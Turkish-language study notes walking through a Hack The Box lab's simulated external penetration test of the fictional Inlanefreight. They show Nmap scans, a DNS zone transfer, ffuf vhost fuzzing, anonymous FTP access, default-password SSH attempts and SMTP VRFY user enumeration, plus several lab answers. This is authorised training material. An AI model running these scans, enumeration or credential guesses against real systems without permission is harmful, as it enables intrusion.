---
{"dg-publish":true,"permalink":"/active-directory/attacking-enterprise-networks/"}
---




* Pre-Engagement
* Information Gathering
* Vulnerability Assessment
* Exploitation
* Post-Exploitation
* Lateral Movement
* Proof of Concept
* Post-Engagement

# Scenario & Kickoff

Müşterimiz Inlanefreight, çevre güvenliğini değerlendirmek için tam kapsamlı bir External Penetration Test gerçekleştirmek üzere şirketimiz Acme Security, Ltd. ile sözleşme imzalamıştır. Müşteri bizden mümkün olduğunca çok sayıda güvenlik açığı tespit etmemizi istedi; bu nedenle, kaçamak testler gerekli değildir. İnternette anonim bir kullanıcı tarafından ne tür bir erişim sağlanabileceğini görmek istiyorlar. Rules of Engagement (RoE) uyarınca, DMZ'yi aşabilir ve iç ağa girebilirsek, Active Directory domain tehlikesi de dahil olmak üzere bu erişimi ne kadar ileri götürebileceğimizi görmemizi istiyorlar. Müşteri web uygulaması, VPN veya Active Directory kullanıcı kimlik bilgilerini vermemiştir. Aşağıdaki domain ve ağ aralıkları test kapsamındadır:

|**External Testing**|**Internal Testing**|
|---|---|
|10.129.x.x ("external" facing target host)|172.16.8.0/23|
|*.inlanefreight.local (all subdomains)|172.16.9.0/23|
||INLANEFREIGHT.LOCAL (Active Directory domain)|


Müşteri primer domain ve iç ağları sağlamış ancak bu scope'daki tam subdomain'ler veya ağ içinde karşılaşacağımız “ live ” host'lar hakkında bilgi vermemiştir. Bir saldırganın dış ağlarına karşı ne tür bir görünürlük kazanabileceğini görmek için keşif yapmamızı istiyorlar (ve bir dayanak elde edilirse dahili).

Numaralandırma ve güvenlik açığı taraması gibi otomatik test tekniklerine izin verilmektedir, ancak herhangi bir servis kesintisine neden olmamak için dikkatli çalışmalıyız. Aşağıdakiler bu değerlendirme için kapsam dışıdır:

* Herhangi bir Inlanefreight çalışanına veya müşterisine karşı Kimlik Avı/Sosyal Mühendislik
* Inlanefreight tesislerine yönelik fiziksel saldırılar
* Yıkıcı eylemler veya Servis Reddi (DoS) testi
* Yetkili Inlanefreight BT personelinin yazılı izni olmadan ortamda yapılan değişiklikler


## Project Kickoff

Bu noktada, hem şirket yönetimimiz hem de Inlanefreight BT departmanının yetkili bir üyesi tarafından imzalanmış bir Scope of Work (SoW) belgemiz var. Bu SoW belgesi testin özelliklerini, metodolojimizi, zaman çizelgesini ve üzerinde anlaşmaya varılan toplantıları ve çıktıları listeler. Müşteri ayrıca, genellikle Test Yetkisi belgesi olarak bilinen ayrı bir Rules of Engagement (RoE) belgesi imzalamıştır. Bu belge, teste başlamadan önce elde bulundurulması gereken çok önemli bir belgedir ve tüm değerlendirme türlerinin kapsamını (URL'ler, tek tek IP adresleri, CIDR ağ aralıkları ve varsa kimlik bilgileri) listeler. Bu belgede ayrıca test şirketinden ve Inlanefreight'ten kilit personel de listelenir (cep telefonu numaraları ve e-posta adresleri dahil olmak üzere her iki taraf için en az iki kişi). Belgede ayrıca testin başlangıç ve bitiş tarihi ile izin verilen test aralığı gibi ayrıntılar da listelenmektedir.

Bize test için bir hafta ve taslak raporumuzu yazmamız için iki gün daha verildi (ki bu süre içinde üzerinde çalışmamız gerekiyor). Müşteri 7/24 test yapmamıza izin verdi ancak normal mesai saatleri dışında (Londra saatiyle 18:00'den sonra) herhangi bir ağır güvenlik açığı taraması yapmamızı istedi. Gerekli tüm belgeleri kontrol ettik ve her iki taraftan da gerekli imzaları aldık ve kapsam tamamen dolduruldu, bu nedenle idari açıdan hazırız.


### Test Başlangıcı

Pazartesi sabahı ilk iş ve teste başlamaya hazırız. Test sanal makinemiz kuruldu ve kullanıma hazır ve favori not alma aracımızı kullanarak not almak için bir taslak not alma ve dizin yapısı kurduk. İlk keşif taramalarımız çalışırken, her zaman olduğu gibi, rapor şablonunun mümkün olduğunca çoğunu dolduracağız. Bu, test için sahip olduğumuz zamanı optimize etmek için taramaların tamamlanmasını beklerken kazanabileceğimiz küçük bir verimliliktir. Testin başladığını bildirmek için aşağıdaki e-postayı hazırladık ve gerekli tüm personeli kopyaladık.

![Pasted image 20241230181423.png](/img/user/resimler/Pasted%20image%2020241230181423.png)

E-postayı gönder butonuna basıyoruz ve dışarıdan bilgi toplamaya başlıyoruz.


# External Information Gathering

Hedefi hızlıca tanımak için Nmap ile ilk taramamızı gerçekleştiririz ve çıktıların tamamını proje dizinimizde ilgili alt dizine kaydederiz.

```shell-session
M1R4CKCK@htb[/htb]$ sudo nmap --open -oA inlanefreight_ept_tcp_1k -iL scope 

Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 14:56 EDT
Nmap scan report for 10.129.203.101
Host is up (0.12s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
110/tcp  open  pop3
111/tcp  open  rpcbind
143/tcp  open  imap
993/tcp  open  imaps
995/tcp  open  pop3s
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 2.25 seconds
```

Hızlı ilk 1.000 port TCP taramamızda 11 portun açık olduğunu fark ettik. Görünüşe göre FTP, SSH, e-posta (SMTP, pop3 ve IMAP), DNS ve en az iki web uygulamasıyla ilgili port gibi bazı ek servisleri de çalıştıran bir web sunucusuyla karşı karşıyayız.

- Daha fazla bilgi toplamak ve hedef sistem hakkında detaylı bilgi almak için ek numaralandırma işlemi yapılır.
    
- `-A` bayrağı kullanılarak agresif tarama seçenekleri etkinleştirilir. Bu bayrak işletim sistemi algılama, versiyon bilgisi taraması ve script taraması gibi işlemleri içerir.
    
- `-sV` bayrağı yalnızca servis versiyon bilgilerini toplarken `-A` bayrağı daha kapsamlı bilgiler sağlar ve ek özellikler içerir.
    
- `-A` bayrağı daha fazla trafik oluşturduğu için hedef sistemi tespit açısından daha görünür hale getirebilir.
    
- Çalıştırılan scriptlerin hedef sistem üzerinde yan etkiler oluşturabileceği göz önünde bulundurulmalıdır.
    
- `-A` bayrağını kullanmadan önce scriptlerin zararsız olduğundan ve taramanın hedef sisteme zarar vermeyeceğinden emin olunmalıdır.


```shell-session
M1R4CKCK@htb[/htb]$ sudo nmap --open -p- -A -oA inlanefreight_ept_tcp_all_svc -iL scope

Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 15:27 EDT
Nmap scan report for 10.129.203.101
Host is up (0.12s latency).
Not shown: 65524 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              38 May 30 17:16 flag.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.15
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-05-30T17:15:40
|_Not valid after:  2032-05-27T17:15:40
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp   open  domain   
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|     bind
| dns-nsid: 
|_  bind.version: 
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Inlanefreight
110/tcp  open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-05-30T17:15:40
|_Not valid after:  2032-05-27T17:15:40
|_pop3-capabilities: SASL TOP PIPELINING STLS RESP-CODES AUTH-RESP-CODE CAPA UIDL
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
143/tcp  open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: LITERAL+ LOGIN-REFERRALS more Pre-login post-login ID capabilities listed have LOGINDISABLEDA0001 OK ENABLE IDLE STARTTLS SASL-IR IMAP4rev1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-05-30T17:15:40
|_Not valid after:  2032-05-27T17:15:40
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-05-30T17:15:40
|_Not valid after:  2032-05-27T17:15:40
|_imap-capabilities: LITERAL+ LOGIN-REFERRALS AUTH=PLAINA0001 post-login ID capabilities more have listed OK ENABLE IDLE Pre-login SASL-IR IMAP4rev1
995/tcp  open  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-05-30T17:15:40
|_Not valid after:  2032-05-27T17:15:40
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: SASL(PLAIN) TOP PIPELINING CAPA RESP-CODES AUTH-RESP-CODE USER UIDL
8080/tcp open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: Support Center
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.92%I=7%D=6/20%Time=62B0CA68%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,39,"\x007\0\x06\x85\0\0\x01\0\x01\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03\xc0\x0c\0\x10\0\x03\0\0\0\0\0\r\x0c");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=6/20%OT=21%CT=1%CU=36505%PV=Y%DS=2%DC=T%G=Y%TM=62B0CA8
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
OS:1NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: Host:  ubuntu; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   116.63 ms 10.10.14.1
2   117.72 ms 10.129.203.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.91 seconds
```

- **`-oA inlanefreight_ept_tcp_all_svc`**  
    Çıktıyı "normal", "greppable" ve "XML" formatlarında kaydeder ve dosya adı olarak `inlanefreight_ept_tcp_all_svc` kullanır.
    
- **`-iL scope`**  
    Tarama yapılacak hedeflerin, `scope` adlı bir dosyadan alınmasını sağlar (bu dosyada hedef IP veya domain listesi bulunur).

1. Bu sistemin bir **Ubuntu** işletim sistemi çalıştırdığı tespit edildi.
    
2. Sistem bir tür **HTTP proxy** hizmeti sunuyor.
    
3. **[Nmap grep kılavuzu](https://github.com/leonjza/awesome-nmap-grep)** kullanılarak tarama sonuçlarındaki gereksiz bilgiler filtrelenebilir.
    
4. Çalışan **servisler** ve **servis numaraları** çıkarılarak daha sonraki incelemeler için hazır hale getirilebilir.


```shell-session
M1R4CKCK@htb[/htb]$ egrep -v "^#|Status: Up" inlanefreight_ept_tcp_all_svc.gnmap | cut -d ' ' -f4- | tr ',' '\n' | \                                                               
sed -e 's/^[ \t]*//' | awk -F '/' '{print $7}' | grep -v "^$" | sort | uniq -c \
| sort -k 1 -nr

      2 Dovecot pop3d
      2 Dovecot imapd (Ubuntu)
      2 Apache httpd 2.4.41 ((Ubuntu))
      1 vsftpd 3.0.3
      1 Postfix smtpd
      1 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
      1 2-4 (RPC #100000)
```


1. Bu **dinleyen servislerden** hemen deneyebileceğimiz birkaç şey var.
    
2. Ancak, **DNS** servisinin mevcut olduğunu gördüğümüz için, bir **DNS Zone Transfer** deneyelim.
    
3. Bu işlemle geçerli **subdomain**'leri numaralandırarak daha fazla keşif yapabilir ve test kapsamımızı genişletebiliriz.
    
4. **Scope** dökümanından, birincil **domain**'in **INLANEFREIGHT.LOCAL** olduğunu biliyoruz, bu yüzden neler bulabileceğimizi görelim.


```shell-session
1R4CKCK@htb[/htb]$ dig axfr inlanefreight.local @10.129.203.101

; <<>> DiG 9.16.27-Debian <<>> axfr inlanefreight.local @10.129.203.101
;; global options: +cmd
inlanefreight.local.	86400	IN	SOA	ns1.inlanfreight.local. dnsadmin.inlanefreight.local. 21 604800 86400 2419200 86400
inlanefreight.local.	86400	IN	NS	inlanefreight.local.
inlanefreight.local.	86400	IN	A	127.0.0.1
blog.inlanefreight.local. 86400	IN	A	127.0.0.1
careers.inlanefreight.local. 86400 IN	A	127.0.0.1
dev.inlanefreight.local. 86400	IN	A	127.0.0.1
gitlab.inlanefreight.local. 86400 IN	A	127.0.0.1
ir.inlanefreight.local.	86400	IN	A	127.0.0.1
status.inlanefreight.local. 86400 IN	A	127.0.0.1
support.inlanefreight.local. 86400 IN	A	127.0.0.1
tracking.inlanefreight.local. 86400 IN	A	127.0.0.1
vpn.inlanefreight.local. 86400	IN	A	127.0.0.1
inlanefreight.local.	86400	IN	SOA	ns1.inlanfreight.local. dnsadmin.inlanefreight.local. 21 604800 86400 2419200 86400
;; Query time: 116 msec
;; SERVER: 10.129.203.101#53(10.129.203.101)
;; WHEN: Mon Jun 20 16:28:20 EDT 2022
;; XFR size: 14 records (messages 1, bytes 448)
```

**@10.129.203.101**, sorgunun yapılacağı **DNS sunucusunu** temsil eder. Bu IP adresi olmadan zone transfer işlemi doğru hedefe yönlendirilemez.

Zone transferi çalışıyor ve 9 ek subdomain buluyoruz. Gerçek dünyadaki bir etkileşimde, DNS Zone Transfer mümkün değilse, subdomainleri birçok şekilde numaralandırabiliriz. DNSDumpster.com web sitesi hızlı bir seçenektir. Information Gathering - Web Edition modülü, Passive Subdomain Enumeration ve Active Subdomain Enumeration için çeşitli yöntemler listeler.

Eğer DNS devrede olmasaydı, ffuf gibi bir araç kullanarak vhost numaralandırması da yapabilirdik. Zone transferinin gözden kaçırdığı başka bir şey bulup bulamayacağımızı görmek için burada deneyelim. Bize yardımcı olması için Pwnbox'ta /opt/useful/seclists/Discovery/DNS/namelist.txt adresinde bulunan [bu](https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/namelist.txt) sözlük listesini kullanacağız.

Vhost'ları fuzz'lamak için öncelikle var olmayan bir vhost için yanıtın neye benzediğini bulmalıyız. Burada istediğimiz herhangi bir şeyi seçebiliriz; biz sadece bir yanıt oluşturmak istiyoruz, bu yüzden büyük olasılıkla var olmayan bir şey seçmeliyiz.

```shell-session
M1R4CKCK@htb[/htb]$ curl -s -I http://10.129.203.101 -H "HOST: defnotvalid.inlanefreight.local" | grep "Content-Length:"

Content-Length: 15157
```


Host başlığında defnotvalid belirtmeye çalışmak bize 15157'lik bir response boyutu verir. Bunun herhangi bir geçersiz vhost için aynı olacağı sonucunu çıkarabiliriz, bu yüzden geçersiz olduklarını bildiğimiz için 15157 boyutundaki yanıtları filtrelemek için -fs bayrağını kullanarak ffuf ile çalışalım.

```shell-session
M1R4CKCK@htb[/htb]$ ffuf -w namelist.txt:FUZZ -u http://10.129.203.101/ -H 'Host:FUZZ.inlanefreight.local' -fs 15157

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.203.101/
 :: Wordlist         : FUZZ: namelist.txt
 :: Header           : Host: FUZZ.inlanefreight.local
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 15157
________________________________________________

blog                    [Status: 200, Size: 8708, Words: 1509, Lines: 232, Duration: 143ms]
careers                 [Status: 200, Size: 51810, Words: 22044, Lines: 732, Duration: 153ms]
dev                     [Status: 200, Size: 2048, Words: 643, Lines: 74, Duration: 1262ms]
gitlab                  [Status: 302, Size: 113, Words: 5, Lines: 1, Duration: 226ms]
ir                      [Status: 200, Size: 28545, Words: 2888, Lines: 210, Duration: 1089ms]
<REDACTED>              [Status: 200, Size: 56, Words: 3, Lines: 4, Duration: 120ms]
status                  [Status: 200, Size: 917, Words: 112, Lines: 43, Duration: 126ms]
support                 [Status: 200, Size: 26635, Words: 11730, Lines: 523, Duration: 122ms]
tracking                [Status: 200, Size: 35185, Words: 10409, Lines: 791, Duration: 124ms]
vpn                     [Status: 200, Size: 1578, Words: 414, Lines: 35, Duration: 121ms]
:: Progress: [151265/151265] :: Job [1/1] :: 341 req/sec :: Duration: [0:07:33] :: Errors: 0 ::
```

Sonuçları karşılaştırdığımızda, gerçekleştirdiğimiz DNS Zone Transfer sonuçlarının bir parçası olmayan bir vhost görüyoruz.

## Enumeration Results

İlk numaralandırmamızdan, bir sonraki bölümde daha fazla araştıracağımız birkaç ilginç portun açık olduğunu fark ettik. Ayrıca birkaç subdomain/vhosts topladık. Bunları /etc/hosts dosyamıza ekleyelim, böylece her birini daha fazla araştırabiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ sudo tee -a /etc/hosts > /dev/null <<EOT

## inlanefreight hosts 
10.129.203.101 inlanefreight.local blog.inlanefreight.local careers.inlanefreight.local dev.inlanefreight.local gitlab.inlanefreight.local ir.inlanefreight.local status.inlanefreight.local support.inlanefreight.local tracking.inlanefreight.local vpn.inlanefreight.local
EOT
```

Bir sonraki bölümde, Nmap tarama sonuçlarını daha derinlemesine inceleyeceğiz ve doğrudan istismar edilebilir veya yanlış yapılandırılmış servisler bulup bulamayacağımıza bakacağız.


Soru : Hedef hostta dinlenen servislerin banner yakalamasını gerçekleştirin ve standart olmayan bir servis banner'ı bulun. Adı yanıtınız olarak gönderin (biçim: word_word_word)

Cevap : 1337_HTB_DNS

![Pasted image 20241230184904.png](/img/user/resimler/Pasted%20image%2020241230184904.png)

![Pasted image 20241230184855.png](/img/user/resimler/Pasted%20image%2020241230184855.png)

![Pasted image 20241230184845.png](/img/user/resimler/Pasted%20image%2020241230184845.png)



Soru : Hedefe karşı bir DNS Zone Transfer gerçekleştirin ve bir bayrak bulun. Bayrak değerini yanıtınız olarak gönderin (bayrak biçimi: HTB{ }).

Cevap : 

![Pasted image 20241230185002.png](/img/user/resimler/Pasted%20image%2020241230185002.png)


Soru : İlişkili subdomain'in FQDN'si nedir?

Cevap :  flag.inlanefreight.local

Soru : Vhost keşfi gerçekleştirin. Hangi ek vhost var? (tek kelime)

Cevap : 

![Pasted image 20241230185209.png](/img/user/resimler/Pasted%20image%2020241230185209.png)

![Pasted image 20241230185750.png](/img/user/resimler/Pasted%20image%2020241230185750.png)

![Pasted image 20241230185758.png](/img/user/resimler/Pasted%20image%2020241230185758.png)


# Service Enumeration & Exploitation

### Listening Services

Nmap taramalarımız birkaç ilginç servisler ortaya çıkardı:

- Port 21: FTP
- Port 22: SSH
- Port 25: SMTP
- Port 53: DNS
- Port 80: HTTP
- Ports 110/143/993/995: imap & pop3
- Port 111: rpcbind

İlk bilgi toplamamız sırasında zaten bir DNS Zone Transfer gerçekleştirdik ve bu da daha sonra daha derinlemesine inceleyeceğimiz birkaç subdomain ortaya çıkardı. Diğer DNS saldırıları mevcut ortamımızda denemeye değmez.


## FTP

Port 21 üzerindeki FTP ile başlayalım. Nmap Agresif Tarama, FTP anonim oturum açmanın mümkün olduğunu keşfetti. Bunu manuel olarak doğrulayalım.

```shell-session
M1R4CKCK@htb[/htb]$ ftp 10.129.203.101

Connected to 10.129.203.101.
220 (vsFTPd 3.0.3)
Name (10.129.203.101:tester): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              38 May 30 17:16 flag.txt
226 Directory send OK.
ftp>
```

Anonim kullanıcı ve boş şifre ile bağlantı kurulabiliyor. Görünüşe göre ilginç dosyalara erişim sağlayamıyoruz, sadece bir tanesine erişebiliyoruz ve ayrıca dizin değiştiremiyoruz.

```shell-session
ftp> put test.txt 

local: test.txt remote: test.txt
200 PORT command successful. Consider using PASV.
550 Permission denied.
```

Ayrıca bir dosya da yükleyemiyoruz.

FTP Bounce Attack gibi diğer saldırılar olası değildir ve henüz iç ağ hakkında herhangi bir bilgimiz yok. [vsFTPd 3.0.3](https://www.exploit-db.com/exploits/49719) için genel exploit'leri aramak, yalnızca testimizin kapsamı dışında olan bir Remote Denial of Service için bu PoC'yi gösterir. Herhangi bir kullanıcı adı bilmediğimiz için Brute forcing de burada bize yardımcı olmayacaktır.

Bu bir çıkmaz sokak gibi görünüyor. Devam edelim.


## SSH

Sırada SSH var. Bir banner grab ile başlayacağız:

```shell-session
M1R4CKCK@htb[/htb]$ nc -nv 10.129.203.101 22

(UNKNOWN) [10.129.203.101] 22 (ssh) open
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
```

Bu bize hostun OpenSSH sürüm 8.2'yi çalıştırdığını gösteriyor ki bu sürümün yazım sırasında bilinen bir güvenlik açığı yok. Brute-forcing  deneyebiliriz, ancak geçerli kullanıcı adlarının bir listesine sahip değiliz, bu yüzden karanlıkta bir atış olacaktır. 
Ayrıca root şifresini brute-force yapabileceğimiz de şüpheli. admin:admin, root:toor, admin:Welcome, admin:Pass123 gibi birkaç kombinasyon deneyebiliriz ancak başarılı olamayız.

```shell-session
M1R4CKCK@htb[/htb]$ ssh admin@10.129.203.101

The authenticity of host '10.129.203.101 (10.129.203.101)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.203.101' (ECDSA) to the list of known hosts.
admin@10.129.203.101's password: 
Permission denied, please try again.
```

SSH da çıkmaz sokak gibi görünüyor. Bakalım başka neyimiz var.


### Email Services

SMTP ilginç bir konudur. Yardım için Attacking Common Services modülünün Attacking Email Services bölümüne başvurabiliriz. Gerçek dünya değerlendirmesinde, MX Kayıtlarını listelemek için [MXToolbox](https://mxtoolbox.com/) gibi bir web sitesini veya dig aracını kullanabiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ sudo nmap -sV -sC -p25 10.129.203.101

Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 18:55 EDT
Nmap scan report for inlanefreight.local (10.129.203.101)
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-05-30T17:15:40
|_Not valid after:  2032-05-27T17:15:40
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
|_ssl-date: TLS randomness does not represent time
Service Info: Host:  ubuntu

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.37 second
```

Ardından, kimlik doğrulama ile ilgili herhangi bir yanlış yapılandırma olup olmadığını kontrol edeceğiz. Sistem kullanıcılarını listelemek için VRFY komutunu kullanmayı deneyebiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ telnet 10.129.203.101 25

Trying 10.129.203.101...
Connected to 10.129.203.101.
Escape character is '^]'.
220 ubuntu ESMTP Postfix (Ubuntu)
VRFY root
252 2.0.0 root
VRFY www-data
252 2.0.0 www-data
VRFY randomuser
550 5.1.1 <randomuser>: Recipient address rejected: User unknown in local recipient table
```

VRFY komutunun devre dışı bırakılmadığını görebiliriz ve bunu geçerli kullanıcıları listelemek için kullanabiliriz. Bu potansiyel olarak FTP ve SSH hizmetlerine ve belki de diğerlerine karşı bir parola zorlama saldırısı düzenlemek için kullanabileceğimiz bir kullanıcı listesi toplamak için kullanılabilir. Bu nispeten düşük riskli olsa da, müşterilerimizin harici saldırı yüzeylerini mümkün olduğunca azaltmaları gerektiğinden, raporumuz için Düşük bulgu olarak not etmeye değer. Bu komutun etkinleştirilmesi için geçerli bir iş nedeni yoksa, devre dışı bırakmalarını tavsiye etmeliyiz.

smtp-user-enum gibi bir araçla daha fazla kullanıcıyı numaralandırmayı deneyebilir ve potansiyel olarak daha fazla kullanıcı bulabiliriz. Genellikle dışa dönük servisler için kimlik doğrulamayı brute-forcing yapmak için fazla zaman harcamaya değmez. Bu bir servis kesintisine neden olabilir, bu nedenle bir kullanıcı listesi oluşturabilsek bile, birkaç zayıf parola deneyebilir ve yolumuza devam edebiliriz.

Bu işlemi EXPN ve RCPT TO komutlarıyla tekrarlayabiliriz, ancak bu ek bir şey sağlamayacaktır.

POP3 protokolü, nasıl kurulduğuna bağlı olarak kullanıcıları numaralandırmak için de kullanılabilir. USER komutu ile sistem kullanıcılarını tekrar numaralandırmayı deneyebiliriz ve sunucu +OK ile yanıt verirse, kullanıcı sistemde var demektir. Bu bizim için işe yaramıyor. POP3 için SSL/TLS portu olan 995 portunu yoklamak da bir sonuç vermiyor.

```shell-session
M1R4CKCK@htb[/htb]$ telnet 10.129.203.101 110

Trying 10.129.203.101...
Connected to 10.129.203.101.
Escape character is '^]'.
+OK Dovecot (Ubuntu) ready.
user www-data
-ERR [AUTH] Plaintext authentication disallowed on non-secure (SSL/TLS) connections.
```

Footprinting modülü, ortak servisler ve numaralandırma ilkeleri hakkında daha fazla bilgi içerir ve bu bölüm üzerinde çalıştıktan sonra tekrar gözden geçirilmeye değerdir.

Gerçek dünya değerlendirmesinde müşterinin e-posta uygulamasına daha fazla bakmak isteriz. Office 365 veya şirket içi Exchange kullanıyorlarsa, VPN üzerinden bağlanmak için geçerli bir e-posta parolası kullanabilirsek, e-posta gelen kutularına veya potansiyel olarak iç ağa erişim sağlayabilecek bir password spraying saldırısı düzenleyebiliriz. Ayrıca, uydurma kullanıcılar olarak e-posta göndererek veya bir e-postayı resmi göstermek için bir e-posta hesabını taklit ederek ve çalışanları kimlik bilgilerini girmeleri veya bir yükü çalıştırmaları için kandırmaya çalışarak Kimlik Avı için kötüye kullanabileceğimiz bir Open Relay ile karşılaşabiliriz. Phishing bu özel değerlendirme için kapsam dışıdır ve muhtemelen çoğu External Penetration Test için de öyle olacaktır, bu nedenle bu tür bir güvenlik açığı ile karşılaşırsak onaylamaya ve raporlamaya değer olacaktır, ancak önce müşteriyle kontrol etmeden basit doğrulamadan daha ileri gitmemeliyiz. Ancak, bu tam kapsamlı bir kırmızı ekip değerlendirmesinde son derece yararlı olabilir.

Yine de kontrol edebiliriz ancak müşterimiz için iyi olan açık bir relay bulamayız!

```shell-session
M1R4CKCK@htb[/htb]$ nmap -p25 -Pn --script smtp-open-relay  10.129.203.101

Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 19:14 EDT
Nmap scan report for inlanefreight.local (10.129.203.101)
Host is up (0.12s latency).

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server doesn't seem to be an open relay, all tests failed

Nmap done: 1 IP address (1 host up) scanned in 24.30 seconds
```

## Moving On

